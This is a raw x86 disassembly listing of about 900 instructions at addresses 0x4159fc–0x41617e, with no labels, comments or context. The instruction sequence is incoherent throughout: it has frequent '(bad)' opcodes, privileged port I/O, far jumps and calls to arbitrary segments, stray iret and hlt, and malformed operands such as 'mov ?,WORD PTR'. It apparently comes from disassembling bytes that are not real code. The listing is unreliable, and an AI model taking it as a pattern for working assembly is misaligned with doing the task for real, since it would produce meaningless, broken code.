  4159fc:	pushf  
  4159fd:	repz mov edi,0x833b0ed3
  415a03:	sbb    ch,BYTE PTR [esi+0x69951889]
  415a09:	cmp    bh,ah
  415a0b:	les    eax,FWORD PTR [edi]
  415a0d:	pushf  
  415a0e:	mov    dh,0xfb
  415a10:	inc    edx
  415a11:	xor    esp,DWORD PTR [ecx-0x55]
  415a14:	mov    eax,0x56d23bf7
  415a19:	xchg   esi,eax
  415a1a:	or     al,0x34
  415a1c:	sub    DWORD PTR [eax+0x12],ebx
  415a1f:	dec    ebx
  415a20:	cmp    DWORD PTR [eax-0x32bce68f],esi
  415a26:	inc    ecx
  415a27:	adc    al,0x2f
  415a29:	mov    edi,0xe75272c6
  415a2e:	sbb    DWORD PTR [ecx],edx
  415a30:	iret   
  415a31:	mov    gs,WORD PTR cs:[ecx-0x78d8529]
  415a38:	je     0x415a3b
  415a3a:	je     0x415a91
  415a3c:	das    
  415a3d:	icebp  
  415a3e:	jecxz  0x415a31
  415a40:	retf   
  415a41:	pushf  
  415a42:	(bad)  
  415a43:	dec    edi
  415a44:	fnstcw WORD PTR [esi+0x585515ab]
  415a4a:	pushf  
  415a4b:	fdivr  DWORD PTR [ecx+0x6a]
  415a4e:	fs jmp 0xd65e:0x5c87e85f
  415a56:	jmp    0xd231:0xac11986a
  415a5d:	pop    eax
  415a5e:	lds    esp,FWORD PTR [edi+0x33]
  415a61:	ins    BYTE PTR es:[edi],dx
  415a62:	or     eax,0xda0a3f12
  415a67:	dec    eax
  415a68:	add    al,0xcf
  415a6a:	je     0x415a1e
  415a6c:	push   0xdea36a24
  415a71:	aad    0x53
  415a73:	arpl   WORD PTR [ebx+0x63],sp
  415a76:	in     al,0x60
  415a78:	retf   
  415a79:	pop    ebx
  415a7a:	(bad)  
  415a7b:	(bad)  
  415a7c:	adc    DWORD PTR [edi+eax*2-0x72],edi
  415a80:	sti    
  415a81:	adc    ch,bl
  415a83:	aad    0xa6
  415a85:	jmp    0x415a80
  415a87:	dec    edi
  415a88:	idiv   DWORD PTR [ecx+esi*8]
  415a8b:	sbb    DWORD PTR [edi+0x77],esi
  415a8e:	test   ebx,ebx
  415a90:	push   es
  415a91:	(bad)  
  415a92:	in     eax,dx
  415a93:	nop
  415a94:	stos   BYTE PTR es:[edi],al
  415a95:	and    DWORD PTR [esi-0x31],ebp
  415a98:	cmp    ebx,DWORD PTR [ebx+0x11bf798e]
  415a9e:	push   es
  415a9f:	pop    ecx
  415aa0:	lock in al,dx
  415aa2:	dec    edx
  415aa3:	cmc    
  415aa4:	adc    dh,bh
  415aa6:	paddq  mm2,mm0
  415aa9:	scas   al,BYTE PTR es:[edi]
  415aaa:	and    BYTE PTR [edi],ch
  415aac:	push   ds
  415aad:	jns    0x415abb
  415aaf:	enter  0xf9e3,0xb1
  415ab3:	adc    eax,0x6ec3f1d4
  415ab8:	daa    
  415ab9:	xor    esi,DWORD PTR [esi]
  415abb:	inc    ecx
  415abc:	push   ebp
  415abd:	iret   
  415abe:	and    ah,BYTE PTR [edx-0x1d]
  415ac1:	ins    BYTE PTR es:[edi],dx
  415ac2:	jb     0x415ad8
  415ac4:	or     edx,DWORD PTR [edi+eax*4+0x28]
  415ac8:	xlat   BYTE PTR ds:[ebx]
  415ac9:	inc    DWORD PTR [edi-0x3aabe6a6]
  415acf:	scas   eax,DWORD PTR es:[edi]
  415ad0:	cmp    al,0xd1
  415ad2:	cmp    BYTE PTR [ebx],0x34
  415ad5:	jmp    0x415a87
  415ad7:	xchg   ecx,eax
  415ad8:	ror    DWORD PTR [eax+0x44dac498],1
  415ade:	mov    al,0x8a
  415ae0:	ret    
  415ae1:	jb     0x415aa8
  415ae3:	fld    QWORD PTR [edi+0x44]
  415ae6:	ja     0x415b39
  415ae8:	jl     0x415ab2
  415aea:	xchg   esi,eax
  415aeb:	daa    
  415aec:	loopne 0x415ad5
  415aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aef:	test   al,0x26
  415af1:	and    eax,edx
  415af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af4:	fnstcw WORD PTR [ecx+0x6b]
  415af7:	out    dx,eax
  415af8:	sbb    eax,0x3cc6c690
  415afd:	test   al,0xd4
  415aff:	mov    ch,0x25
  415b01:	pop    ss
  415b02:	mov    ecx,0x10d002b7
  415b07:	sbb    ah,BYTE PTR fs:[ecx-0x32]
  415b0b:	sub    ah,BYTE PTR [edx]
  415b0d:	pusha  
  415b0e:	(bad)  
  415b0f:	pmaddwd mm4,QWORD PTR [ebx+eiz*2+0x7e3606af]
  415b17:	or     BYTE PTR [ecx+0x5a],al
  415b1a:	sbb    ebp,DWORD PTR [esi]
  415b1c:	call   0x84db:0x53dfa994
  415b23:	aaa    
  415b24:	dec    ecx
  415b25:	or     ebp,edi
  415b27:	mov    ch,0x34
  415b29:	jecxz  0x415ba6
  415b2b:	inc    ecx
  415b2c:	icebp  
  415b2d:	xchg   esi,eax
  415b2e:	call   0xff0afe3
  415b33:	jmp    0x5b6e:0xc0140095
  415b3a:	mov    ah,0xc7
  415b3c:	push   ss
  415b3d:	xor    DWORD PTR [esi],eax
  415b3f:	sub    eax,0x59a05838
  415b44:	pop    esp
  415b45:	imul   esp,DWORD PTR [eax+0x28],0x8e11ad89
  415b4c:	ror    DWORD PTR [ebx],1
  415b4e:	push   esp
  415b4f:	sbb    al,0x5a
  415b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b52:	adc    esi,ebp
  415b54:	cmp    DWORD PTR [edx+eax*8-0x68],esi
  415b58:	add    al,0x37
  415b5a:	mov    ch,0xdb
  415b5c:	pop    ebp
  415b5d:	sub    ecx,DWORD PTR [ecx-0x2824293f]
  415b63:	not    DWORD PTR [ecx]
  415b65:	mov    bh,0x2b
  415b67:	cmp    eax,0x5c374845
  415b6c:	inc    ecx
  415b6d:	call   0x45b7:0xd85f8328
  415b74:	cmp    BYTE PTR [edi+edi*1],0xa7
  415b78:	frstor [esi]
  415b7a:	cmp    cl,BYTE PTR ds:0xad7a8c8d
  415b80:	inc    esi
  415b81:	jae    0x415be8
  415b83:	push   cs
  415b84:	mov    bh,0xe5
  415b86:	(bad)  
  415b88:	call   0x228d:0x62f105db
  415b8f:	jnp    0x415bcc
  415b91:	into   
  415b92:	int    0x9d
  415b94:	in     eax,0xcb
  415b96:	xor    dl,BYTE PTR [esi+0x3f]
  415b99:	mov    al,0x6d
  415b9c:	sbb    al,0x56
  415b9e:	in     al,dx
  415b9f:	fcmovnbe st,st(5)
  415ba1:	jg     0x415b3c
  415ba3:	xchg   dh,ah
  415ba5:	bound  esp,QWORD PTR [esi+0x67]
  415ba8:	es sti 
  415baa:	mov    ecx,0x6cca1d5b
  415baf:	and    al,0x45
  415bb1:	jg     0x415b50
  415bb3:	test   al,0x3f
  415bb5:	and    al,0xc6
  415bb7:	push   eax
  415bb8:	xlat   BYTE PTR ds:[ebx]
  415bb9:	dec    eax
  415bba:	sar    bl,cl
  415bbc:	mov    eax,0x2a90c8c9
  415bc1:	daa    
  415bc2:	push   ebp
  415bc3:	sub    al,0x3b
  415bc5:	aas    
  415bc6:	out    0xf2,eax
  415bc8:	lahf   
  415bc9:	sbb    eax,0x3c2bf263
  415bce:	jns    0x415ba3
  415bd0:	mov    al,ds:0x7eb0964a
  415bd5:	push   ebp
  415bd6:	push   es
  415bd7:	mov    ds:0x8d1128f1,al
  415bdc:	fwait
  415bdd:	stc    
  415bde:	mov    bh,bl
  415be0:	jg     0x415bea
  415be2:	push   ds
  415be3:	nop
  415be4:	int3   
  415be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415be6:	ja     0x415baa
  415be8:	(bad)  
  415be9:	pushf  
  415bea:	or     eax,eax
  415bec:	neg    DWORD PTR [ebx-0x72]
  415bef:	sbb    cl,BYTE PTR [edx]
  415bf1:	out    dx,al
  415bf2:	retf   0xe7a1
  415bf5:	ret    0x3a9c
  415bf8:	jge    0x415c75
  415bfa:	ror    DWORD PTR ds:0x521fc296,1
  415c00:	repnz mov al,0x1d
  415c03:	xchg   DWORD PTR [esi+0x26],ecx
  415c06:	ss retf 
  415c08:	test   al,0x86
  415c0a:	or     eax,0x4bc71b59
  415c0f:	add    ecx,ebp
  415c11:	aad    0x5a
  415c13:	push   es
  415c14:	nop
  415c15:	adc    eax,0xe4357a4c
  415c1a:	scas   al,BYTE PTR es:[edi]
  415c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c1c:	jo     0x415c48
  415c1e:	(bad)  
  415c20:	cmp    BYTE PTR [ecx+0x406f5fb9],0x2e
  415c27:	outs   dx,BYTE PTR ds:[esi]
  415c28:	mov    edx,0x16c05eda
  415c2d:	inc    DWORD PTR [edx]
  415c2f:	sbb    BYTE PTR [edx],0xd8
  415c32:	xchg   dh,ch
  415c34:	outs   dx,DWORD PTR ds:[esi]
  415c35:	pop    ebx
  415c36:	mov    ?,WORD PTR [ebx-0x4c]
  415c39:	loopne 0x415bf7
  415c3b:	pop    es
  415c3c:	div    DWORD PTR [eax+0x5bd5774b]
  415c42:	(bad)  
  415c43:	stos   DWORD PTR es:[edi],eax
  415c44:	mov    WORD PTR [edi],cs
  415c46:	fadd   QWORD PTR [ebp+0x6d]
  415c49:	out    0xb7,al
  415c4b:	shl    BYTE PTR [esp+ecx*8+0x38baa8fa],0xf0
  415c53:	out    dx,eax
  415c54:	xchg   ebp,eax
  415c55:	jle    0x415cb2
  415c57:	fwait
  415c58:	cmp    dl,BYTE PTR [ecx]
  415c5a:	enter  0x3502,0xf2
  415c5e:	or     al,0xce
  415c60:	inc    edi
  415c61:	push   ds
  415c62:	out    0xd3,eax
  415c64:	pop    ecx
  415c65:	xor    BYTE PTR [esi],cl
  415c67:	inc    edx
  415c68:	or     esp,DWORD PTR [ebp+0x3d]
  415c6b:	dec    esi
  415c6c:	(bad)  
  415c6d:	mov    edi,0x6745a158
  415c72:	ja     0x415c17
  415c74:	push   eax
  415c75:	jae    0x415cf3
  415c77:	sete   bh
  415c7a:	test   al,0x4a
  415c7c:	lods   eax,DWORD PTR ds:[esi]
  415c7d:	imul   DWORD PTR [edi+0x19]
  415c80:	sub    ebp,esi
  415c82:	sub    DWORD PTR [ebx+edi*4+0x2ebbaabb],ebx
  415c89:	test   DWORD PTR [ebx+0x45],esi
  415c8c:	and    cl,al
  415c8e:	dec    ebx
  415c8f:	mov    ebp,0x1faf2ff3
  415c94:	pop    esp
  415c95:	call   0x65078443
  415c9a:	jp     0x415c28
  415c9c:	sub    DWORD PTR gs:[ecx-0x568ac3a4],ebx
  415ca3:	xor    esp,DWORD PTR [ecx+ecx*8-0x1a]
  415ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca8:	push   ds
  415ca9:	out    dx,eax
  415caa:	enter  0xafc9,0x9f
  415cae:	js     0x415ceb
  415cb0:	jns    0x415c44
  415cb2:	push   cs
  415cb3:	mov    ds:0xd63316d8,al
  415cb8:	pop    ds
  415cb9:	jne    0x415cb2
  415cbb:	dec    ebp
  415cbc:	jg     0x415c93
  415cbe:	nop
  415cbf:	adc    DWORD PTR [eax+edx*1],esp
  415cc2:	push   ds
  415cc3:	xor    DWORD PTR [edi+0x3a],0x20
  415cc7:	jp     0x415ca2
  415cc9:	add    al,0x24
  415ccb:	pop    edi
  415ccc:	xchg   esi,eax
  415ccd:	daa    
  415cce:	inc    eax
  415ccf:	push   0xb0b69a60
  415cd4:	mov    dl,0x46
  415cd6:	push   edx
  415cd7:	sbb    al,0x64
  415cd9:	fwait
  415cda:	push   eax
  415cdb:	mov    bh,0x20
  415cdd:	mov    al,ds:0x113bf0d9
  415ce2:	mov    cs,WORD PTR [ebx+0x40]
  415ce5:	add    eax,0x59ee7d3c
  415cea:	ins    BYTE PTR es:[edi],dx
  415ceb:	imul   ebp,DWORD PTR [ebx],0xcb038007
  415cf1:	xchg   edx,eax
  415cf2:	call   FWORD PTR [esi]
  415cf4:	mov    ebx,DWORD PTR [edi]
  415cf6:	xchg   esi,eax
  415cf7:	cmp    BYTE PTR [ebx+0x7c],cl
  415cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cfb:	or     bl,BYTE PTR [ebp+0x67]
  415cfe:	out    dx,eax
  415cff:	ja     0x415d36
  415d01:	sub    ah,dl
  415d03:	cmc    
  415d04:	jmp    0x293c27b1
  415d09:	gs setne bl
  415d0d:	xor    bh,BYTE PTR [esi]
  415d0f:	popa   
  415d10:	mov    eax,0xb8c2d0b5
  415d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d16:	cmp    DWORD PTR [edx],0x5970aad
  415d1c:	xchg   ebx,eax
  415d1d:	ins    BYTE PTR es:[edi],dx
  415d1e:	push   ecx
  415d1f:	sub    esp,DWORD PTR [eax+0x38]
  415d22:	inc    edx
  415d23:	adc    eax,0xdf884b81
  415d28:	jp     0x415ccd
  415d2a:	jp     0x415d52
  415d2c:	push   0x54
  415d2e:	or     BYTE PTR [ebp+ecx*8+0x60],bl
  415d32:	mov    dl,BYTE PTR [esi]
  415d34:	pop    ss
  415d35:	xor    eax,0xd553f10
  415d3a:	adc    dh,bh
  415d3c:	dec    esp
  415d3d:	(bad)  
  415d3e:	fistp  QWORD PTR [edx-0x42]
  415d41:	bnd jbe 0x415d19
  415d44:	sbb    bh,BYTE PTR [edx+esi*2-0x4dceb027]
  415d4b:	ret    0x57ac
  415d4e:	fwait
  415d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d50:	test   DWORD PTR [ebx-0x56],eax
  415d53:	scas   eax,DWORD PTR es:[edi]
  415d54:	jmp    0x415d98
  415d56:	mul    eax
  415d58:	adc    ebx,DWORD PTR [eax-0x46]
  415d5b:	jnp    0x415d75
  415d5d:	or     al,0xc8
  415d5f:	leave  
  415d60:	mov    eax,0x68c67051
  415d65:	mov    al,ds:0x94b16276
  415d6a:	das    
  415d6b:	(bad)  
  415d6c:	or     BYTE PTR [edi-0x5b7e57c6],bl
  415d72:	mov    edx,?
  415d74:	jge    0x415d96
  415d76:	xchg   edi,eax
  415d77:	ds push edi
  415d79:	jbe    0x415dcc
  415d7b:	xchg   esi,eax
  415d7c:	jge    0x415d7e
  415d7e:	ret    0x725a
  415d81:	mov    BYTE PTR [ebp-0x4f410f1c],cl
  415d87:	out    dx,eax
  415d88:	ins    DWORD PTR es:[edi],dx
  415d89:	push   0xa8dd26b4
  415d8e:	in     al,0x70
  415d90:	add    eax,0xad0902a1
  415d95:	arpl   dx,di
  415d97:	pop    edx
  415d98:	ret    
  415d99:	adc    DWORD PTR [ebx+0x45],0x5c66eae1
  415da0:	aad    0x4d
  415da2:	stos   BYTE PTR es:[edi],al
  415da3:	jmp    0xffb647ce
  415da8:	add    eax,0x936395a0
  415dad:	xchg   ebx,eax
  415dae:	push   0x39f87b22
  415db3:	dec    ebp
  415db4:	sar    DWORD PTR [edi-0x3e154e9f],0xf6
  415dbb:	inc    esp
  415dbc:	push   ebp
  415dbd:	cdq    
  415dbe:	rcl    DWORD PTR [ebx-0x59],0x22
  415dc2:	jg     0x415e42
  415dc4:	es xchg esi,eax
  415dc6:	stos   BYTE PTR es:[edi],al
  415dc7:	mov    esi,0x236c6e0
  415dcc:	jb     0x415d6f
  415dce:	and    bh,ah
  415dd0:	xor    bl,bl
  415dd2:	add    ebp,esi
  415dd4:	xor    al,0x90
  415dd6:	cmp    BYTE PTR [esi+0x32],al
  415dd9:	xor    DWORD PTR [ecx+eiz*4-0x2fe73fe0],ecx
  415de0:	xchg   ebx,eax
  415de1:	outs   dx,DWORD PTR fs:[esi]
  415de3:	sub    esi,esp
  415de5:	pop    edx
  415de6:	sbb    BYTE PTR [eax+0x1328ae74],dh
  415dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ded:	inc    ebp
  415dee:	addr16 pop eax
  415df0:	jno    0x415d83
  415df2:	loopne 0x415ddf
  415df4:	mov    eax,0xd8ed9387
  415df9:	ret    0xe67c
  415dfc:	xor    al,BYTE PTR [ecx]
  415dfe:	push   esi
  415dff:	cdq    
  415e00:	or     edi,DWORD PTR cs:[eax]
  415e03:	fimul  DWORD PTR [edx]
  415e05:	xor    DWORD PTR [ebx+0x10],0xffffff8d
  415e09:	pop    edx
  415e0a:	cmp    cl,bl
  415e0c:	inc    ebx
  415e0d:	add    BYTE PTR [esi+0x532e2da1],ch
  415e13:	bound  esi,QWORD PTR [edx+edi*1]
  415e16:	sbb    DWORD PTR [edx+esi*1],esp
  415e19:	inc    esp
  415e1a:	mov    DWORD PTR [esi-0x5c],ebp
  415e1d:	mov    ds:0xbdb33106,eax
  415e22:	dec    ebp
  415e23:	sbb    BYTE PTR [edx-0x3c],0x2d
  415e27:	sbb    ebp,ecx
  415e29:	out    dx,eax
  415e2a:	test   DWORD PTR [esi],0x4f6b1f74
  415e30:	repz push ecx
  415e32:	mov    dl,dl
  415e34:	cli    
  415e35:	mov    dh,0x75
  415e37:	mov    ds:0xfb91a160,eax
  415e3c:	les    ebp,FWORD PTR [eax+0x3e]
  415e3f:	jne    0x415dd5
  415e41:	mov    eax,gs
  415e43:	outs   dx,BYTE PTR ds:[esi]
  415e44:	adc    ch,dh
  415e46:	or     BYTE PTR [ecx],ah
  415e48:	cwde   
  415e49:	xor    edi,ebp
  415e4b:	loope  0x415ea2
  415e4d:	pop    eax
  415e4e:	or     al,0x68
  415e50:	test   al,dl
  415e52:	test   ch,ah
  415e54:	xchg   ebp,eax
  415e55:	adc    ecx,DWORD PTR [ebx-0x10]
  415e58:	add    eax,0x7766cf27
  415e5d:	cmp    dl,dh
  415e5f:	test   eax,0x1e4e92e2
  415e64:	add    BYTE PTR [edi+0x3f3258a2],dl
  415e6a:	cmp    DWORD PTR [eax],0x210f9d27
  415e70:	mov    BYTE PTR [eiz*8+0x52285e02],ch
  415e77:	xchg   edx,eax
  415e78:	jnp    0x415e07
  415e7a:	fidiv  DWORD PTR [ecx+edi*4+0x494e892f]
  415e81:	repz hlt 
  415e83:	jns    0x415e3f
  415e85:	scas   eax,DWORD PTR es:[edi]
  415e86:	loope  0x415ed8
  415e88:	push   0xee89bde1
  415e8d:	leave  
  415e8e:	call   edx
  415e90:	in     eax,dx
  415e91:	div    BYTE PTR [eax-0x3b726757]
  415e97:	push   eax
  415e98:	mov    esp,0xab0732cd
  415e9d:	inc    ebx
  415e9e:	in     eax,0x6c
  415ea0:	fcom   DWORD PTR ds:0x1c85c165
  415ea6:	clc    
  415ea7:	xchg   edi,eax
  415ea8:	dec    edx
  415ea9:	push   ebx
  415eaa:	in     eax,0x49
  415eac:	retf   0xae2d
  415eaf:	mov    dl,0x16
  415eb1:	mov    edi,0xe683d540
  415eb6:	(bad)  
  415eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb9:	and    al,0xcc
  415ebb:	jb     0x415f39
  415ebd:	sti    
  415ebe:	stc    
  415ebf:	and    al,BYTE PTR [edx+0x5b]
  415ec2:	sub    esp,DWORD PTR [edx]
  415ec4:	aam    0x10
  415ec6:	lds    esi,FWORD PTR [esp+eiz*4]
  415ec9:	shl    DWORD PTR [ecx-0xe323bc7],cl
  415ecf:	cmp    al,0x83
  415ed1:	jae    0x415e8a
  415ed3:	pop    ebx
  415ed4:	and    BYTE PTR [ebp+eax*1+0x20],ch
  415ed8:	lods   eax,DWORD PTR ds:[esi]
  415ed9:	pop    eax
  415eda:	ins    DWORD PTR es:[edi],dx
  415edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415edc:	aas    
  415edd:	push   ds
  415ede:	fld    TBYTE PTR [ebp-0x486508d5]
  415ee4:	fcom   QWORD PTR [ebx]
  415ee6:	es or  ebx,esi
  415ee9:	inc    esi
  415eea:	push   cs
  415eeb:	pop    esi
  415eec:	les    edi,FWORD PTR [esi+ecx*4+0x38f6bdf9]
  415ef3:	sbb    BYTE PTR ds:0xeb96fce8,ah
  415ef9:	outs   dx,DWORD PTR ds:[esi]
  415efa:	test   esi,ecx
  415efc:	sbb    DWORD PTR [eax],eax
  415efe:	std    
  415eff:	cs enter 0x6001,0x4b
  415f04:	pop    es
  415f05:	jne    0x415f75
  415f07:	test   al,0x84
  415f09:	xchg   edi,eax
  415f0a:	sub    bh,BYTE PTR [ebx]
  415f0c:	xchg   edx,eax
  415f0d:	bndldx (bad),[ecx]
  415f10:	sbb    DWORD PTR [ebx+0x157133a4],0x26
  415f17:	push   0xffffffa1
  415f19:	hlt    
  415f1a:	data16 mov dl,0x73
  415f1d:	mov    al,ds:0x69633a86
  415f22:	lock cmp al,0x6c
  415f25:	lods   al,BYTE PTR es:[esi]
  415f27:	pushf  
  415f28:	test   al,0x9
  415f2a:	mov    al,ds:0xaa8a9fee
  415f2f:	hlt    
  415f30:	rcl    dh,0x9d
  415f33:	shr    BYTE PTR [eax+0x77],cl
  415f36:	xchg   edi,eax
  415f37:	lods   al,BYTE PTR ds:[esi]
  415f38:	es dec edx
  415f3a:	sahf   
  415f3b:	popa   
  415f3c:	(bad)  
  415f3d:	jmp    0xd24a:0xb54b0d39
  415f44:	push   ebp
  415f45:	cmp    eax,edx
  415f47:	(bad)  
  415f49:	sub    bl,BYTE PTR [ebx-0x58]
  415f4c:	shl    DWORD PTR [edx+0x1],0x62
  415f50:	imul   edi,DWORD PTR [ebx-0x1e],0xc7f7e97a
  415f57:	jge    0x415fba
  415f59:	cs jle 0x415fb0
  415f5c:	pop    ecx
  415f5d:	pusha  
  415f5e:	inc    edx
  415f5f:	or     eax,0x13520c3d
  415f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f65:	fs sub BYTE PTR ss:[ecx],dh
  415f69:	fsubr  st(7),st
  415f6b:	std    
  415f6c:	sub    BYTE PTR [eax-0x5e],bl
  415f6f:	sbb    ch,ah
  415f71:	lahf   
  415f72:	add    eax,0x1e5fbe14
  415f77:	xor    BYTE PTR [eax-0x6a],0xf3
  415f7b:	inc    esi
  415f7c:	imul   edi,DWORD PTR [ebp+0x25],0x64d839a0
  415f83:	cs cwde 
  415f85:	jg     0x415f98
  415f87:	cmp    ecx,ebp
  415f89:	pusha  
  415f8a:	shl    BYTE PTR [ebp-0x6396a8ff],cl
  415f90:	xor    al,0xa6
  415f92:	adc    al,0x8b
  415f94:	pop    edi
  415f95:	pushf  
  415f96:	shl    DWORD PTR [edi-0x40],cl
  415f99:	ins    BYTE PTR es:[edi],dx
  415f9a:	loopne 0x415fd4
  415f9c:	(bad)  
  415f9d:	ds hlt 
  415f9f:	mov    DWORD PTR [esi],ebx
  415fa1:	shl    DWORD PTR [edi+0x3d],cl
  415fa4:	test   eax,0x8951b7dd
  415fa9:	stc    
  415faa:	xchg   edx,eax
  415fab:	(bad)  
  415fac:	adc    eax,0x3e53d32b
  415fb1:	mov    bh,0x75
  415fb3:	rcl    BYTE PTR [esi+0x13],0x15
  415fb7:	fnstcw WORD PTR [eax+edi*2]
  415fba:	addr16 sti 
  415fbc:	xor    BYTE PTR [ebp+0x6f],0xa2
  415fc0:	(bad)  
  415fc1:	mov    ecx,0xcd2c0d5c
  415fc6:	xchg   DWORD PTR ds:0xace65fc7,ebp
  415fcc:	mov    esp,0xfd2c3fa8
  415fd1:	popa   
  415fd2:	out    dx,eax
  415fd3:	int3   
  415fd4:	add    ebp,DWORD PTR [ebp-0x1b0f32de]
  415fda:	and    edx,0x7f902a48
  415fe0:	cld    
  415fe1:	fidivr DWORD PTR [ebp+0x23]
  415fe4:	mov    dh,0x27
  415fe6:	mov    ebx,0x1920dd47
  415feb:	mov    dh,0x52
  415fed:	test   al,0xf0
  415fef:	mov    al,ds:0xb62f2241
  415ff4:	inc    edx
  415ff5:	xor    ch,BYTE PTR [edx-0x5]
  415ff8:	push   eax
  415ff9:	add    eax,0x314f68c
  415ffe:	out    dx,eax
  415fff:	xor    DWORD PTR [edx+0x77],0x24
  416003:	and    BYTE PTR [edi+0x9f813c2],cl
  416009:	mov    BYTE PTR [edx+ebp*2+0xc],cl
  41600d:	sub    BYTE PTR [ebp+0xf],bl
  416010:	retf   
  416011:	neg    eax
  416013:	fidiv  WORD PTR [edi+0x5b5e1745]
  416019:	call   0xb600:0x32dc1898
  416020:	and    ebx,DWORD PTR [bp+di-0x6f]
  416024:	test   eax,0x56d6a9dc
  416029:	mov    ebx,0xcaca3557
  41602e:	dec    edi
  41602f:	adc    esi,0xffffffce
  416032:	retf   
  416033:	leave  
  416034:	mov    dh,0x97
  416036:	jg     0x416088
  416038:	int    0x96
  41603a:	cmp    BYTE PTR [edx],0x43
  41603d:	xchg   ecx,eax
  41603e:	adc    DWORD PTR [ecx-0x34],0xc4632821
  416045:	cs inc ebx
  416047:	push   ds
  416048:	js     0x41604e
  41604a:	outs   dx,DWORD PTR ds:[esi]
  41604b:	pop    edi
  41604c:	into   
  41604d:	gs jno 0x416096
  416050:	push   edi
  416051:	shl    ebx,cl
  416053:	adc    cl,BYTE PTR [eax]
  416055:	int3   
  416056:	jge    0x41609f
  416058:	sahf   
  416059:	xchg   esi,eax
  41605a:	in     eax,0xbe
  41605c:	sbb    dh,bl
  41605e:	xor    eax,0x18bbffc9
  416063:	retf   0x47df
  416066:	jns    0x41609f
  416068:	sbb    edx,DWORD PTR [ebx+0x76]
  41606b:	pop    esi
  41606c:	sbb    BYTE PTR [edx-0x34],dl
  41606f:	adc    al,0x60
  416071:	sbb    dh,BYTE PTR [edx+edi*2]
  416074:	data16 loop 0x4160c1
  416077:	mul    BYTE PTR [ecx-0x37]
  41607a:	push   edi
  41607b:	adc    BYTE PTR [edi-0x36],bl
  41607e:	mov    dh,0xd6
  416080:	je     0x4160eb
  416082:	jne    0x41605d
  416084:	inc    esi
  416085:	icebp  
  416086:	mov    ah,0xe0
  416088:	das    
  416089:	pop    ds
  41608a:	mov    ecx,DWORD PTR ds:0x22fc5daf
  416090:	in     eax,dx
  416091:	mov    edi,0x103cb7b5
  416096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416097:	add    al,BYTE PTR [ebx]
  416099:	xchg   ebp,eax
  41609a:	xchg   ebx,eax
  41609b:	(bad)  
  41609c:	not    BYTE PTR [ecx]
  41609e:	fbstp  TBYTE PTR [edx]
  4160a0:	jg     0x41602c
  4160a2:	pop    eax
  4160a3:	sub    ch,BYTE PTR [ebx]
  4160a5:	retf   0x272e
  4160a8:	(bad)  
  4160a9:	cmc    
  4160aa:	test   al,0xd2
  4160ac:	xor    al,0xba
  4160ae:	xchg   BYTE PTR [ecx+0x73e24d93],bh
  4160b4:	mov    ebx,ecx
  4160b6:	sub    DWORD PTR [ecx],edi
  4160b8:	sbb    BYTE PTR [esi+edi*4],ch
  4160bb:	ret    0x8ea0
  4160be:	clc    
  4160bf:	test   BYTE PTR [esp+eiz*4-0x3aec0a4f],bh
  4160c6:	out    0x7e,eax
  4160c8:	ret    0x320
  4160cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160cc:	and    esp,DWORD PTR [ecx+0x7487306]
  4160d2:	mov    cl,BYTE PTR [edx+0x3a471056]
  4160d8:	mov    eax,0x949d9a27
  4160dd:	shr    DWORD PTR [ebx-0x7e8054eb],1
  4160e3:	jge    0x416128
  4160e5:	mov    ds:0x83d661da,eax
  4160ea:	ins    DWORD PTR es:[edi],dx
  4160eb:	add    eax,DWORD PTR [edx-0x18]
  4160ee:	inc    ecx
  4160ef:	push   ds
  4160f0:	jl     0x41613e
  4160f2:	es pop es
  4160f4:	scas   eax,DWORD PTR es:[edi]
  4160f5:	(bad)  
  4160f6:	mov    ds:0x2a9b85c7,eax
  4160fb:	and    eax,0xb8bc20bf
  416100:	fstp   DWORD PTR [ebx]
  416102:	test   ah,0x43
  416105:	sbb    bh,bh
  416107:	and    al,0xbb
  416109:	outs   dx,BYTE PTR ds:[esi]
  41610a:	(bad)  
  41610b:	push   ss
  41610c:	out    0x29,eax
  41610e:	dec    esp
  41610f:	mov    ds:0x35f167c9,eax
  416114:	rcl    BYTE PTR [ebp+0x636e8908],cl
  41611a:	mov    ebp,0x1ac3736
  41611f:	xor    eax,0x49537eef
  416124:	pop    ebx
  416125:	mov    bl,0x9a
  416127:	mov    bh,0x67
  416129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41612a:	push   edx
  41612b:	and    bh,0xee
  41612e:	push   edi
  41612f:	jecxz  0x4160f3
  416131:	dec    esi
  416132:	mov    di,0x9d9f
  416136:	mov    dl,0x3e
  416138:	sub    BYTE PTR [edi+0x39],dh
  41613b:	inc    ecx
  41613c:	add    ch,dh
  41613e:	icebp  
  41613f:	ror    BYTE PTR ds:0x3f8838a4,cl
  416145:	sub    al,0x50
  416147:	rcl    esi,1
  416149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41614a:	js     0x416149
  41614c:	aaa    
  41614d:	retf   
  41614e:	dec    ecx
  41614f:	out    dx,eax
  416150:	bound  edx,QWORD PTR [edi]
  416152:	mov    ecx,0x6c796268
  416157:	cld    
  416158:	dec    edx
  416159:	bound  esp,QWORD PTR [ecx+eiz*8]
  41615c:	add    esp,DWORD PTR [eax]
  41615e:	cmp    al,0xad
  416160:	mov    ebx,0x61feb801
  416165:	mov    dh,0x6c
  416167:	adc    ecx,ebx
  416169:	fdiv   st(4),st
  41616b:	fcmovu st,st(2)
  41616d:	jnp    0x416122
  41616f:	sub    BYTE PTR [edx],0x2f
  416172:	cmp    esp,0x9
  416175:	leave  
  416176:	pop    ebp
  416177:	dec    eax
  416178:	enter  0xdc6e,0xe0
  41617c:	cmp    al,0xf7
  41617e:	xchg   DWORD PTR [eax+0x2631dc8b],ecx
